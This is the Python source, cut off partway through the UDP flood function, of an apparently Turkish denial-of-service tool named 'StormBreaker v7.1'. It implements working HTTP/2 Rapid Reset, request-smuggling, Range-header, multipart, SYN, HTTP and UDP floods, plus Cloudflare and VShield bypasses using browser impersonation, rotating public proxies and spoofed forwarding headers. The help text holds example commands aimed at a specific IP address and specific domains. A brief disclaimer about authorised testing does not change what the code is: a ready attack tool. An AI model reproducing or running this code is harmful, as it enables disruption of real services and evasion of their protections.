#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import subprocess
import importlib
import os
import threading
import time
import socket
import random
import argparse
import json
import signal
import ssl
from datetime import datetime
import requests
import dns.resolver

# ------------------------------------------------------------
# OTOMATİK BAĞIMLILIK KURULUMU (curl_cffi EKLENDİ)
# ------------------------------------------------------------
def install_and_import(package, import_name=None):
    if import_name is None:
        import_name = package
    try:
        importlib.import_module(import_name)
        return True
    except ImportError:
        print(f"[*] '{package}' modülü bulunamadı. Otomatik kuruluyor...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
            importlib.import_module(import_name)
            print(f"[+] '{package}' kurulumu tamamlandı!")
            return True
        except Exception as e:
            print(f"[-] '{package}' kurulumu başarısız: {e}")
            return False

packages = [
    ("requests", "requests"),
    ("dnspython", "dns"),
    ("h2", "h2"),
    ("websocket-client", "websocket"),
    ("scapy", "scapy"),
    ("colorama", "colorama"),
    ("rich", "rich"),
    ("curl_cffi", "curl_cffi"),
]

for pkg, imp in packages:
    install_and_import(pkg, imp)

# ------------------------------------------------------------
# RICH KÜTÜPHANESİ
# ------------------------------------------------------------
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.text import Text
from rich.live import Live
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn
from rich import box

console = Console()

# ------------------------------------------------------------
# GLOBAL DURDURMA BAYRAĞI VE İSTATİSTİKLER
# ------------------------------------------------------------
stop_flag = False
global_stats = {"success": 0, "failed": 0, "rps": 0, "start_time": time.time()}

def signal_handler(sig, frame):
    global stop_flag
    console.print("\n[bold red]⛔ Ctrl+C algılandı! Tüm thread'ler durduruluyor...[/bold red]")
    stop_flag = True

signal.signal(signal.SIGINT, signal_handler)

# ------------------------------------------------------------
# SCAPY / HTTP/2 / WEBSOCKET KONTROLLERİ
# ------------------------------------------------------------
try:
    from scapy.all import IP, TCP, send
    SCAPY_AVAILABLE = True
except:
    SCAPY_AVAILABLE = False

try:
    import h2.connection
    import h2.config
    import h2.events
    H2_AVAILABLE = True
except:
    H2_AVAILABLE = False

try:
    import websocket
    WEBSOCKET_AVAILABLE = True
except:
    WEBSOCKET_AVAILABLE = False

# ------------------------------------------------------------
# curl_cffi KONTROL
# ------------------------------------------------------------
try:
    from curl_cffi import requests as cffi_requests
    CFFI_AVAILABLE = True
except:
    CFFI_AVAILABLE = False

# ------------------------------------------------------------
# BANNER (RECTANGLES)
# ------------------------------------------------------------
banner_text = """
 _____ _____ _____ _____ _____    _____ _____ _____ _____ _____ _____ _____ 
|   __|_   _|     | __  |     |  | __  | __  |   __|  _  |  |  |   __| __  |
|__   | | | |  |  |    -| | | |  | __ -|    -|   __|     |    -|   __|    -|
|_____| |_| |_____|__|__|_|_|_|  |_____|__|__|_____|__|__|__|__|_____|__|__|
"""

banner = Panel(
    banner_text,
    title="[bold red]🌀 STORM BREAKER v7.1[/bold red]",
    subtitle="[yellow]⚡ Ultimate Bypass Edition ⚡[/yellow]",
    border_style="blue",
    padding=(1, 2)
)

console.print(banner)
console.print("[bold red]⚠️  Bu araç yalnızca izinli test ortamlarında kullanılmalıdır![/bold red]")
console.print("[bold red]⚠️  İzinsiz kullanım yasa dışıdır ve ağır cezaları vardır.[/bold red]\n")

# ------------------------------------------------------------
# ARGÜMANLAR
# ------------------------------------------------------------
parser = argparse.ArgumentParser(description="StormBreaker v7.1 - Ultimate Bypass Edition", add_help=False)
parser.add_argument("--target", required=True, help="Hedef IP veya domain")
parser.add_argument("--port", type=int, default=80, help="Tekil port (varsayılan: 80)")
parser.add_argument("--port-range", help="Port aralığı (örn: 80,443,8080 veya 1-65535)")
parser.add_argument("--threads", type=int, default=100, help="Eşzamanlı thread sayısı")
parser.add_argument("--duration", type=int, default=30, help="Saldırı süresi (saniye)")
parser.add_argument("--timeout", type=int, default=5, help="Bağlantı zaman aşımı")

# Saldırı türleri
parser.add_argument("--rapid-reset", action="store_true", help="HTTP/2 Rapid Reset")
parser.add_argument("--desync", action="store_true", help="HTTP Desync")
parser.add_argument("--range", action="store_true", help="Range Header Abuse")
parser.add_argument("--multipart", action="store_true", help="Multipart Form Flood")
parser.add_argument("--layer4", action="store_true", help="SYN Flood")
parser.add_argument("--layer7", action="store_true", help="HTTP Flood")
parser.add_argument("--quality", action="store_true", help="Gelişmiş HTTP")
parser.add_argument("--udp", action="store_true", help="UDP Flood")
parser.add_argument("--ai-mode", action="store_true", help="Otomatik strateji")

# ========== BYPASS MODÜLLERİ (curl_cffi) ==========
parser.add_argument("--cf-uam", action="store_true", help="Cloudflare Under Attack Mode Bypass (curl_cffi)")
parser.add_argument("--cfb", action="store_true", help="Cloudflare Normal Bypass (curl_cffi)")
parser.add_argument("--vshield", action="store_true", help="VShield Bypass")

# Proxy
parser.add_argument("--update-proxies", action="store_true", help="ProxyScrape'ten güncel proxy indir")
parser.add_argument("--proxy-sources", default="http,https,socks4,socks5", help="Proxy protokolleri")
parser.add_argument("--proxy-list", metavar="DOSYA", help="Proxy listesi dosyası")
parser.add_argument("--proxy-type", default="http", help="Proxy tipi")

# Raporlama
parser.add_argument("--report", metavar="DOSYA", help="Sonuçları JSON olarak kaydet")
parser.add_argument("--verbose", action="store_true", help="Detaylı log")

# ------------------------------------------------------------
# ÖZEL YARDIM MESAJI (SIRALI VE DÜZENLİ)
# ------------------------------------------------------------
def print_help_with_examples():
    console.print("[bold cyan]📖 STORM BREAKER v7.1 - KULLANIM KILAVUZU[/bold cyan]\n")
    
    console.print("[bold yellow]🔹 ZORUNLU ARGÜMANLAR:[/bold yellow]")
    console.print("  --target HEDEF       → Hedef IP veya domain (ZORUNLU)\n")
    
    console.print("[bold yellow]🔹 PORT SEÇENEKLERİ:[/bold yellow]")
    console.print("  --port PORT          → Tekil port (varsayılan: 80)")
    console.print("  --port-range ARALIK  → Port aralığı (örn: 80,443,8080 veya 1-65535)\n")
    
    console.print("[bold yellow]🔹 SALDIRI SÜRESİ VE PERFORMANS:[/bold yellow]")
    console.print("  --threads SAYI       → Eşzamanlı thread sayısı (varsayılan: 100)")
    console.print("  --duration SANIYE    → Saldırı süresi (varsayılan: 30)")
    console.print("  --timeout SANIYE     → Bağlantı zaman aşımı (varsayılan: 5)\n")
    
    console.print("[bold yellow]🔹 SALDIRI TÜRLERİ (TEMEL):[/bold yellow]")
    console.print("  --layer4        → SYN Flood (ağ katmanı)")
    console.print("  --layer7        → HTTP Flood (uygulama katmanı)")
    console.print("  --udp           → UDP Flood (DNS amplifikasyon)")
    console.print("  --quality       → Gelişmiş HTTP (Keep-Alive + POST)")
    console.print("  --range         → Range Header Abuse (büyük dosya parçalama)")
    console.print("  --multipart     → Multipart Form Flood (büyük form verisi)")
    console.print("  --rapid-reset   → HTTP/2 Rapid Reset (Cloudflare'yi zorlar)")
    console.print("  --desync        → HTTP Desync (Request Smuggling)")
    console.print("  --ai-mode       → Otomatik strateji seçimi (Cloudflare tespiti)\n")
    
    console.print("[bold yellow]🔹 BYPASS MODÜLLERİ (GELİŞMİŞ):[/bold yellow]")
    console.print("  --cfb           → Cloudflare Normal Bypass (curl_cffi ile)")
    console.print("  --cf-uam        → Cloudflare Under Attack Mode Bypass (JS challenge)")
    console.print("  --vshield       → VShield Bypass (özel header + proxy havuzu)\n")
    
    console.print("[bold yellow]🔹 PROXY SEÇENEKLERİ:[/bold yellow]")
    console.print("  --update-proxies        → ProxyScrape'ten güncel proxy listesini indir")
    console.print("  --proxy-sources TÜR     → İndirilecek proxy türleri (varsayılan: http,https,socks4,socks5)")
    console.print("  --proxy-list DOSYA      → Kendi proxy listeni kullan")
    console.print("  --proxy-type TÜR        → Proxy tipi (http/https/socks4/socks5)\n")
    
    console.print("[bold yellow]🔹 RAPORLAMA VE DİĞER:[/bold yellow]")
    console.print("  --report DOSYA      → Sonuçları JSON olarak kaydet")
    console.print("  --verbose           → Detaylı log (her isteğin durumunu göster)\n")
    
    console.print("[bold yellow]📌 ÖRNEK KULLANIMLAR:[/bold yellow]")
    console.print("[green]1. Tekil port (30001) Rapid Reset:[/green]")
    console.print("  python storm.py --target 141.95.95.185 --port 30001 --rapid-reset --update-proxies --threads 200 --duration 60 --report rapid.json\n")
    
    console.print("[green]2. SYN Flood (Layer4) ile tekil port:[/green]")
    console.print("  python storm.py --target 141.95.95.185 --port 30001 --layer4 --update-proxies --threads 500 --duration 30\n")
    
    console.print("[green]3. HTTP Flood (Layer7) ile tekil port:[/green]")
    console.print("  python storm.py --target example.com --port 80 --layer7 --update-proxies --threads 100 --duration 30\n")
    
    console.print("[green]4. HTTP Desync (Request Smuggling):[/green]")
    console.print("  python storm.py --target example.com --port 80 --desync --threads 100 --duration 30\n")
    
    console.print("[green]5. Multipart Form Flood:[/green]")
    console.print("  python storm.py --target example.com --port 80 --multipart --threads 150 --duration 30\n")
    
    console.print("[green]6. Range Header Abuse:[/green]")
    console.print("  python storm.py --target example.com --port 80 --range --threads 100 --duration 30\n")
    
    console.print("[green]7. UDP Flood (DNS amplifikasyon):[/green]")
    console.print("  python storm.py --target 141.95.95.185 --port 30001 --udp --threads 100 --duration 30\n")
    
    console.print("[green]8. Quality (Gelişmiş HTTP):[/green]")
    console.print("  python storm.py --target example.com --port 80 --quality --update-proxies --threads 150 --duration 30\n")
    
    console.print("[green]9. AI Modu (Otomatik Strateji):[/green]")
    console.print("  python storm.py --target graph.vshield.pro --port 443 --ai-mode --update-proxies --threads 200 --duration 30 --report ai.json\n")
    
    console.print("[bold yellow]📌 BYPASS ÖRNEKLERİ:[/bold yellow]")
    console.print("[green]10. Cloudflare Normal Bypass (CFB):[/green]")
    console.print("  python storm.py --target graph.vshield.pro --port 443 --cfb --update-proxies --threads 200 --duration 30 --verbose --report cfb.json\n")
    
    console.print("[green]11. Cloudflare Under Attack Mode Bypass (CF-UAM):[/green]")
    console.print("  python storm.py --target uam.doffybee.com --port 443 --cf-uam --update-proxies --threads 200 --duration 20 --report cf_uam.json\n")
    
    console.print("[green]12. VShield Bypass:[/green]")
    console.print("  python storm.py --target graph.vshield.pro --port 443 --vshield --update-proxies --threads 100 --duration 30 --report vshield.json\n")
    
    console.print("[bold yellow]📌 KOMBİNE SALDIRILAR:[/bold yellow]")
    console.print("[green]13. Kombine Saldırı (Layer7 + Rapid Reset + Multipart):[/green]")
    console.print("  python storm.py --target uam.doffybee.com --port 443 --layer7 --rapid-reset --multipart --update-proxies --threads 300 --duration 60 --report kombine.json\n")
    
    console.print("[bold yellow]📌 PORT ARALIĞI ÖRNEKLERİ:[/bold yellow]")
    console.print("[green]14. Birden fazla porta saldır (80, 443, 8080):[/green]")
    console.print("  python storm.py --target example.com --port-range 80,443,8080 --layer7 --update-proxies --threads 100 --duration 30\n")
    
    console.print("[green]15. Port aralığı (1-1024):[/green]")
    console.print("  python storm.py --target 141.95.95.185 --port-range 1-1024 --layer4 --threads 50 --duration 20\n")
    
    console.print("[green]16. Karışık port aralığı (80,443,8080-8090):[/green]")
    console.print("  python storm.py --target example.com --port-range 80,443,8080-8090 --rapid-reset --update-proxies --threads 100 --duration 30\n")
    
    console.print("[green]17. AI Modu ile port aralığı:[/green]")
    console.print("  python storm.py --target example.com --port-range 80,443,8080 --ai-mode --update-proxies --threads 200 --duration 30\n")
    
    console.print("[green]18. Tüm portlar (1-65535) – ÇOK YAVAŞ!:[/green]")
    console.print("  python storm.py --target 141.95.95.185 --port-range 1-65535 --layer4 --threads 50 --duration 20\n")
    
    console.print("[bold yellow]📌 RAPORLAMA VE DİĞER ÖRNEKLER:[/bold yellow]")
    console.print("[green]19. JSON rapor kaydet:[/green]")
    console.print("  python storm.py --target example.com --port 80 --layer7 --report sonuc.json\n")
    
    console.print("[green]20. Detaylı log (verbose):[/green]")
    console.print("  python storm.py --target example.com --port 80 --layer7 --verbose\n")
    
    console.print("[green]21. Proxy listesi kullan:[/green]")
    console.print("  python storm.py --target example.com --port 80 --layer7 --proxy-list proxies.txt\n")
    
    console.print("[bold red]⚠️  UYARI: Bu araç yalnızca izinli test ortamlarında kullanılmalıdır![/bold red]")
    console.print("[bold red]⚠️  İzinsiz kullanım yasa dışıdır ve ağır cezaları vardır.[/bold red]")
    sys.exit(0)

if "-h" in sys.argv or "--help" in sys.argv:
    print_help_with_examples()

args = parser.parse_args()

# ------------------------------------------------------------
# PORT ARALIĞINI PARSE ET
# ------------------------------------------------------------
def parse_ports(port_input):
    ports = set()
    if port_input is None:
        return [args.port]
    for part in port_input.split(','):
        part = part.strip()
        if '-' in part:
            try:
                start, end = part.split('-')
                start, end = int(start), int(end)
                if start < 1 or end > 65535 or start > end:
                    console.print(f"[red]✗ Geçersiz port aralığı: {part}[/red]")
                    sys.exit(1)
                ports.update(range(start, end + 1))
            except ValueError:
                console.print(f"[red]✗ Geçersiz port aralığı: {part}[/red]")
                sys.exit(1)
        else:
            try:
                port = int(part)
                if port < 1 or port > 65535:
                    console.print(f"[red]✗ Port 1-65535 arasında olmalı: {port}[/red]")
                    sys.exit(1)
                ports.add(port)
            except ValueError:
                console.print(f"[red]✗ Geçersiz port: {part}[/red]")
                sys.exit(1)
    return sorted(ports)

target_ports = parse_ports(args.port_range) if args.port_range else [args.port]

# ------------------------------------------------------------
# PROXY
# ------------------------------------------------------------
proxy_list = []

def load_proxy_list(file_path):
    global proxy_list
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    if '://' not in line:
                        line = f"{args.proxy_type}://{line}"
                    proxy_list.append(line)
        console.print(f"[green]✓ {len(proxy_list)} proxy yüklendi.[/green]")
        return proxy_list
    except Exception as e:
        console.print(f"[red]✗ Proxy listesi yüklenemedi: {e}[/red]")
        return []

def download_proxies(protocols=["http", "https", "socks4", "socks5"]):
    global proxy_list
    base_url = "https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/protocols"
    all_proxies = []
    console.print("[yellow]⏳ Proxy listeleri indiriliyor...[/yellow]")
    for protocol in protocols:
        protocol = protocol.strip().lower()
        url = f"{base_url}/{protocol}/data.txt"
        try:
            console.print(f"  [cyan]→ {protocol.upper()} proxy indiriliyor...[/cyan]")
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                for line in resp.text.splitlines():
                    line = line.strip()
                    if line and not line.startswith('#'):
                        for proxy in line.split():
                            if proxy and '://' in proxy:
                                all_proxies.append(proxy)
                console.print(f"    [green]✓ Tamamlandı[/green]")
            else:
                console.print(f"    [red]✗ Hata (HTTP {resp.status_code})[/red]")
        except Exception as e:
            console.print(f"    [red]✗ Hata: {e}[/red]")
    proxy_list = list(set(all_proxies))
    console.print(f"[green]✓ Toplam {len(proxy_list)} benzersiz proxy indirildi.[/green]")
    return proxy_list

def get_random_proxy():
    if not proxy_list:
        return None
    return random.choice(proxy_list)

# ------------------------------------------------------------
# CANLI İSTATİSTİK GÜNCELLEME
# ------------------------------------------------------------
def update_stats(success=True):
    global global_stats
    if success:
        global_stats["success"] += 1
    else:
        global_stats["failed"] += 1

# ------------------------------------------------------------
# CLOUDFLARE UNDER ATTACK MODE BYPASS (CF-UAM) – DÜZELTİLDİ
# ------------------------------------------------------------
def cf_uam_bypass(target, port, duration, threads):
    if not CFFI_AVAILABLE:
        console.print("[red]✗ curl_cffi kurulu değil! Lütfen 'pip install curl_cffi' yapın.[/red]")
        return {"success": 0, "failed": 0, "rps": 0}
    
    console.print(f"[yellow]⏳ Cloudflare Under Attack Mode Bypass başlatılıyor: {target}:{port} - {duration}s[/yellow]")
    console.print("[cyan]→ curl_cffi ile JS challenge çözülüyor (chrome120)...[/cyan]")
    
    success = 0
    failed = 0
    lock = threading.Lock()
    
    try:
        session = cffi_requests.Session(impersonate="chrome120")
        session.verify = False
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1"
        }
        
        url = f"{'https' if port == 443 else 'http'}://{target}:{port}/"
        console.print(f"[cyan]→ Bağlanılan URL: {url}[/cyan]")
        
        resp = session.get(url, headers=headers, timeout=30)
        if resp.status_code != 200:
            console.print(f"[red]✗ Challenge çözülemedi (HTTP {resp.status_code})[/red]")
            return {"success": 0, "failed": 0, "rps": 0}
        
        cookies = session.cookies.get_dict()
        if 'cf_clearance' not in cookies:
            console.print("[red]✗ cf_clearance çerezi alınamadı![/red]")
            return {"success": 0, "failed": 0, "rps": 0}
        
        console.print("[green]✓ Cloudflare challenge başarıyla çözüldü![/green]")
        
    except Exception as e:
        console.print(f"[red]✗ Cloudflare bypass hatası: {e}[/red]")
        return {"success": 0, "failed": 0, "rps": 0}
    
    def send_request():
        nonlocal success, failed
        end_time = time.time() + duration
        while not stop_flag and time.time() < end_time:
            try:
                pxy = get_random_proxy()
                proxies = {"http": pxy, "https": pxy} if pxy else None
                session.get(url, headers=headers, proxies=proxies, timeout=3)
                with lock:
                    success += 1
                    update_stats(True)
            except:
                with lock:
                    failed += 1
                    update_stats(False)
    
    threads_list = [threading.Thread(target=send_request) for _ in range(threads)]
    for t in threads_list: t.start()
    for t in threads_list: t.join(timeout=1)
    if stop_flag: return {"success": success, "failed": failed, "rps": success/duration}
    console.print(f"[green]✓ CF-UAM Bypass tamamlandı. Başarılı: {success}, Başarısız: {failed}[/green]")
    return {"success": success, "failed": failed, "rps": success / duration}

# ------------------------------------------------------------
# CLOUDFLARE NORMAL BYPASS (CFB) – DÜZELTİLDİ
# ------------------------------------------------------------
def cfb_bypass(target, port, duration, threads):
    if not CFFI_AVAILABLE:
        console.print("[red]✗ curl_cffi kurulu değil! Lütfen 'pip install curl_cffi' yapın.[/red]")
        return {"success": 0, "failed": 0, "rps": 0}
    
    console.print(f"[yellow]⏳ Cloudflare Normal Bypass başlatılıyor: {target}:{port} - {duration}s[/yellow]")
    
    success = 0
    failed = 0
    lock = threading.Lock()
    
    try:
        session = cffi_requests.Session(impersonate="chrome120")
        session.verify = False
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7"
        }
        url = f"{'https' if port == 443 else 'http'}://{target}:{port}/"
        cookies = session.get(url, headers=headers, timeout=20).cookies.get_dict()
    except Exception as e:
        console.print(f"[red]✗ Cloudflare bypass hatası: {e}[/red]")
        return {"success": 0, "failed": 0, "rps": 0}
    
    def send_request():
        nonlocal success, failed
        end_time = time.time() + duration
        while not stop_flag and time.time() < end_time:
            try:
                pxy = get_random_proxy()
                proxies = {"http": pxy, "https": pxy} if pxy else None
                session.get(url, headers=headers, proxies=proxies, timeout=2)
                with lock:
                    success += 1
                    update_stats(True)
            except:
                with lock:
                    failed += 1
                    update_stats(False)
    
    threads_list = [threading.Thread(target=send_request) for _ in range(threads)]
    for t in threads_list: t.start()
    for t in threads_list: t.join(timeout=1)
    if stop_flag: return {"success": success, "failed": failed, "rps": success/duration}
    console.print(f"[green]✓ CFB tamamlandı. Başarılı: {success}, Başarısız: {failed}[/green]")
    return {"success": success, "failed": failed, "rps": success / duration}

# ------------------------------------------------------------
# VSHIELD BYPASS
# ------------------------------------------------------------
def vshield_bypass(target, port, duration, threads):
    console.print(f"[yellow]⏳ VShield Bypass başlatılıyor: {target}:{port} - {duration}s[/yellow]")
    console.print("[cyan]→ Özel header'lar ve proxy havuzu ile VShield aşılıyor...[/cyan]")
    
    success = 0
    failed = 0
    lock = threading.Lock()
    
    custom_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml",
        "Accept-Language": "tr-TR,tr;q=0.9",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Referer": "https://www.google.com/"
    }
    
    url = f"{'https' if port == 443 else 'http'}://{target}:{port}/"
    
    def send_request():
        nonlocal success, failed
        end_time = time.time() + duration
        while not stop_flag and time.time() < end_time:
            try:
                pxy = get_random_proxy()
                proxies = {"http": pxy, "https": pxy} if pxy else None
                session = requests.Session()
                session.verify = False
                session.headers.update(custom_headers)
                session.headers.update({
                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                    "X-Real-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                })
                session.get(url, proxies=proxies, timeout=2)
                with lock:
                    success += 1
                    update_stats(True)
            except:
                with lock:
                    failed += 1
                    update_stats(False)
    
    threads_list = [threading.Thread(target=send_request) for _ in range(threads)]
    for t in threads_list: t.start()
    for t in threads_list: t.join(timeout=1)
    if stop_flag: return {"success": success, "failed": failed, "rps": success/duration}
    console.print(f"[green]✓ VShield Bypass tamamlandı. Başarılı: {success}, Başarısız: {failed}[/green]")
    return {"success": success, "failed": failed, "rps": success / duration}

# ------------------------------------------------------------
# MEVCUT SALDIRI FONKSİYONLARI (KISALTILMIŞ)
# ------------------------------------------------------------
def rapid_reset_attack(target, port, duration, threads):
    if not H2_AVAILABLE:
        console.print("[red]✗ h2 kurulu değil! Lütfen 'pip install h2' yapın.[/red]")
        return {"success": 0, "failed": 0, "rps": 0}
    console.print(f"[yellow]⏳ HTTP/2 Rapid Reset başlatılıyor: {target}:{port} - {duration}s[/yellow]")
    success = 0
    failed = 0
    lock = threading.Lock()
    
    def send_reset():
        nonlocal success, failed
        end_time = time.time() + duration
        while not stop_flag and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    context = ssl.create_default_context()
                    sock = context.wrap_socket(sock, server_hostname=target)
                sock.connect((target, port))
                config = h2.config.H2Configuration(client_side=True)
                conn = h2.connection.H2Connection(config=config)
                conn.initiate_connection()
                sock.send(conn.data_to_send())
                for _ in range(30):
                    stream_id = conn.get_next_available_stream_id()
                    conn.send_headers(stream_id, [
                        (b':method', b'GET'),
                        (b':path', b'/'),
                        (b':scheme', b'https' if port == 443 else b'http'),
                        (b':authority', target.encode()),
                    ], end_stream=False)
                    conn.reset_stream(stream_id)
                    sock.send(conn.data_to_send())
                sock.close()
                with lock:
                    success += 1
                    update_stats(True)
            except:
                with lock:
                    failed += 1
                    update_stats(False)
    
    threads_list = [threading.Thread(target=send_reset) for _ in range(threads)]
    for t in threads_list: t.start()
    for t in threads_list: t.join(timeout=1)
    if stop_flag: return {"success": success, "failed": failed, "rps": success/duration}
    console.print(f"[green]✓ Rapid Reset tamamlandı. Başarılı: {success}, Başarısız: {failed}[/green]")
    return {"success": success, "failed": failed, "rps": success / duration}

def desync_attack(target, port, duration, threads):
    console.print(f"[yellow]⏳ HTTP Desync başlatılıyor: {target}:{port} - {duration}s[/yellow]")
    success = 0
    failed = 0
    lock = threading.Lock()
    
    def send_desync():
        nonlocal success, failed
        end_time = time.time() + duration
        while not stop_flag and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((target, port))
                payload = (
                    "POST / HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    "Content-Length: 13\r\n"
                    "Transfer-Encoding: chunked\r\n"
                    "\r\n"
                    "0\r\n"
                    "\r\n"
                    "GET /admin HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    "\r\n"
                )
                sock.send(payload.encode())
                sock.close()
                with lock:
                    success += 1
                    update_stats(True)
            except:
                with lock:
                    failed += 1
                    update_stats(False)
    
    threads_list = [threading.Thread(target=send_desync) for _ in range(threads)]
    for t in threads_list: t.start()
    for t in threads_list: t.join(timeout=1)
    if stop_flag: return {"success": success, "failed": failed, "rps": success/duration}
    console.print(f"[green]✓ Desync tamamlandı. Başarılı: {success}, Başarısız: {failed}[/green]")
    return {"success": success, "failed": failed, "rps": success / duration}

def range_attack(target, port, duration, threads):
    console.print(f"[yellow]⏳ Range Header Abuse başlatılıyor: {target}:{port} - {duration}s[/yellow]")
    success = 0
    failed = 0
    lock = threading.Lock()
    
    def send_range():
        nonlocal success, failed
        end_time = time.time() + duration
        while not stop_flag and time.time() < end_time:
            try:
                headers = {"Range": f"bytes=0-{random.randint(1024, 1024*1024)}", "User-Agent": "Mozilla/5.0"}
                pxy = get_random_proxy()
                proxies = {"http": pxy, "https": pxy} if pxy else None
                requests.get(f"http://{target}:{port}/", headers=headers, proxies=proxies, timeout=2, verify=False)
                with lock:
                    success += 1
                    update_stats(True)
            except:
                with lock:
                    failed += 1
                    update_stats(False)
    
    threads_list = [threading.Thread(target=send_range) for _ in range(threads)]
    for t in threads_list: t.start()
    for t in threads_list: t.join(timeout=1)
    if stop_flag: return {"success": success, "failed": failed, "rps": success/duration}
    console.print(f"[green]✓ Range Attack tamamlandı. Başarılı: {success}, Başarısız: {failed}[/green]")
    return {"success": success, "failed": failed, "rps": success / duration}

def multipart_attack(target, port, duration, threads):
    console.print(f"[yellow]⏳ Multipart Form Flood başlatılıyor: {target}:{port} - {duration}s[/yellow]")
    success = 0
    failed = 0
    lock = threading.Lock()
    
    def send_multipart():
        nonlocal success, failed
        end_time = time.time() + duration
        boundary = "---------------------------" + str(random.randint(1000, 9999))
        while not stop_flag and time.time() < end_time:
            try:
                data = b"--" + boundary.encode() + b"\r\n"
                data += b"Content-Disposition: form-data; name=\"file\"; filename=\"test.bin\"\r\n"
                data += b"Content-Type: application/octet-stream\r\n\r\n"
                data += b"A" * random.randint(1024*1024, 10*1024*1024)
                data += b"\r\n--" + boundary.encode() + b"--\r\n"
                headers = {"Content-Type": f"multipart/form-data; boundary={boundary}", "Content-Length": str(len(data)), "User-Agent": "Mozilla/5.0"}
                pxy = get_random_proxy()
                proxies = {"http": pxy, "https": pxy} if pxy else None
                requests.post(f"http://{target}:{port}/upload", data=data, headers=headers, proxies=proxies, timeout=2, verify=False)
                with lock:
                    success += 1
                    update_stats(True)
            except:
                with lock:
                    failed += 1
                    update_stats(False)
    
    threads_list = [threading.Thread(target=send_multipart) for _ in range(threads)]
    for t in threads_list: t.start()
    for t in threads_list: t.join(timeout=1)
    if stop_flag: return {"success": success, "failed": failed, "rps": success/duration}
    console.print(f"[green]✓ Multipart Attack tamamlandı. Başarılı: {success}, Başarısız: {failed}[/green]")
    return {"success": success, "failed": failed, "rps": success / duration}

def syn_flood(target, port, duration, threads):
    console.print(f"[yellow]⏳ SYN Flood (Layer4) başlatılıyor: {target}:{port} - {duration}s[/yellow]")
    sent = 0
    lock = threading.Lock()
    def send_syn():
        nonlocal sent
        end_time = time.time() + duration
        while not stop_flag and time.time() < end_time:
            try:
                if SCAPY_AVAILABLE:
                    pkt = IP(dst=target)/TCP(dport=port, flags="S")
                    send(pkt, verbose=0)
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((target, port))
                    sock.send(b"\x00" * 1024)
                    sock.close()
                with lock:
                    sent += 1
                    update_stats(True)
            except:
                pass
    threads_list = [threading.Thread(target=send_syn) for _ in range(threads)]
    for t in threads_list: t.start()
    for t in threads_list: t.join(timeout=1)
    if stop_flag: return {"success": sent, "failed": 0, "rps": sent/duration}
    console.print(f"[green]✓ SYN Flood tamamlandı. Toplam: {sent}[/green]")
    return {"success": sent, "failed": 0, "rps": sent / duration}

def http_flood(target, port, duration, threads):
    console.print(f"[yellow]⏳ HTTP Flood başlatılıyor: {target}:{port} - {duration}s[/yellow]")
    success = 0
    failed = 0
    lock = threading.Lock()
    def send_http():
        nonlocal success, failed
        end_time = time.time() + duration
        while not stop_flag and time.time() < end_time:
            try:
                pxy = get_random_proxy()
                proxies = {"http": pxy, "https": pxy} if pxy else None
                requests.get(f"http://{target}:{port}/", proxies=proxies, timeout=1, verify=False)
                with lock:
                    success += 1
                    update_stats(True)
            except:
                with lock:
                    failed += 1
                    update_stats(False)
    threads_list = [threading.Thread(target=send_http) for _ in range(threads)]
    for t in threads_list: t.start()
    for t in threads_list: t.join(timeout=1)
    if stop_flag: return {"success": success, "failed": failed, "rps": success/duration}
    console.print(f"[green]✓ HTTP Flood tamamlandı. Başarılı: {success}, Başarısız: {failed}[/green]")
    return {"success": success, "failed": failed, "rps": success / duration}

def udp_flood(target, port, duration, threads):
    console.print(f"[yellow]⏳ UDP Flood başlatılıyor: {target}:{port} - {duration}s[/yellow]")
    sent = 0
    lock = threading.Lock()
    dns_query = b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01"
    def send_udp():
        nonlocal sent
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        end_time = time.time() + duration
        while not stop_flag and time.time() < end_time:
            try:
                sock.sendto(dns_query, (target, port))
                with lock:
                    sent += 1
                    update_stats(True)
            except:
                pass
        sock.close()
    threads_list = [threading.Thread(target=send_udp) for _ in range(threads)]
